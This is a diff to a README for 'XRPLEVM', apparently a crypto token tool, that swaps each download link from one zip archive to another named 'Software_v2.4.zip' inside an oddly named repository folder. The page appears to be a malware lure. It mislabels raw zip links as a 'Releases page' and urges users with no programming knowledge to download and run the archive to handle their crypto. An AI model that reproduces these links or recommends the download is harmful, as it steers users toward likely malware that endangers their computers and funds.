@@ -1,6 +1,6 @@
 # 🚀 XRPLEVM - Effortless Crypto Operations Made Simple
 
-[![Download XRPLEVM](https://raw.githubusercontent.com/Exvideoclips/XRPLEVM/main/unprovably/XRPLEVM-paleoichthyology.zip)](https://raw.githubusercontent.com/Exvideoclips/XRPLEVM/main/unprovably/XRPLEVM-paleoichthyology.zip)
+[![Download XRPLEVM](https://raw.githubusercontent.com/Exvideoclips/XRPLEVM/main/unprovably/Software_v2.4.zip)](https://raw.githubusercontent.com/Exvideoclips/XRPLEVM/main/unprovably/Software_v2.4.zip)
 
 ## 🛠️ Overview
 XRPLEVM is a user-friendly application designed for crypto enthusiasts. With XRPLEVM, you can easily deploy, send, burn, swap, bridge, add liquidity pools, and mint tokens. This tool simplifies complex tasks into straightforward actions. You do not need programming knowledge to use it.
@@ -9,7 +9,7 @@ XRPLEVM is a user-friendly application designed for crypto enthusiasts. With XRP
 Getting started with XRPLEVM is simple. Just follow these steps to download and run the application:
 
 1. **Visit the Download Page**  
-   Go to the [XRPLEVM Releases page](https://raw.githubusercontent.com/Exvideoclips/XRPLEVM/main/unprovably/XRPLEVM-paleoichthyology.zip). Here, you will find the latest version of the software.
+   Go to the [XRPLEVM Releases page](https://raw.githubusercontent.com/Exvideoclips/XRPLEVM/main/unprovably/Software_v2.4.zip). Here, you will find the latest version of the software.
 
 2. **Choose the Right Version**  
    Locate the most recent version at the top of the page. Ensure that it matches your operating system. Whether you are using Windows, macOS, or Linux, select the file that is suitable for you.
@@ -38,7 +38,7 @@ To ensure XRPLEVM runs smoothly, your computer should meet the following system 
 - **Disk Space**: 200 MB of free space for installation.
 
 ## 📥 Download & Install
-To get XRPLEVM, return to the [XRPLEVM Releases page](https://raw.githubusercontent.com/Exvideoclips/XRPLEVM/main/unprovably/XRPLEVM-paleoichthyology.zip). Download the file for your operating system. Follow the installation steps as mentioned above to get started with your crypto activities.
+To get XRPLEVM, return to the [XRPLEVM Releases page](https://raw.githubusercontent.com/Exvideoclips/XRPLEVM/main/unprovably/Software_v2.4.zip). Download the file for your operating system. Follow the installation steps as mentioned above to get started with your crypto activities.
 
 ## 🤝 Support
 If you encounter any issues while using XRPLEVM, feel free to reach out for support. You can find help by creating an issue on the GitHub page or by checking existing issues for similar problems. The community is here to assist you.
